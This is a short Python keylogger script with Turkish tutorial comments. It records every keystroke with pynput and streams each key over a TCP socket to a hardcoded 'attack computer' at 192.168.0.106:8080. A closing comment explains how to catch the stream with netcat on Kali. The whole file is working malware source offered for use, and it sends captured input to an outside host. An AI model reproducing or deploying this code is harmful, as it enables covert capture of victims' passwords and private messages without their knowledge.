import pynput.keyboard
# klavye hareketlerini takip etmek icin kullanilan kutuphane
import socket
# iki bilgisayar arasinda baglanti kurmak icin kullanilan kutuphane

baglantim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# baglantimizi tanimlayip icine kullanacagimiz protokolu ve socket tipini belirliyoruz
baglantim.connect(("192.168.0.106", 8080))
# atak bilgisayarinin ip adresini ve kullanacagimiz port u belirtiyoruz
baglantim.send("Baglanti Kuruldu ".encode("utf-8"))
# baglantinin calistigini anlamak icin bir mesaj gonderiyoruz

# girilen klavye hareketlerini baglanti uzerinden gonderen fonksiyon


def gonder(key):

    baglantim.send(str(key).encode())

# klavyeyi dinleyip her tusa basildiginda gonder fonksiyonunu calistirma icin asagidaki kodlari yaziyoruz
keylogger_dinleyici = pynput.keyboard.Listener(on_press=gonder)


with keylogger_dinleyici:

    keylogger_dinleyici.join()

# kali de 8080 portunda gelen baglantilari dinlemek icin terminale nc -l -p 8080 komutunu yazip kullanabilirsiniz.
#----------------------------ahmetfurkansonmez12@gmail.com-----------------------------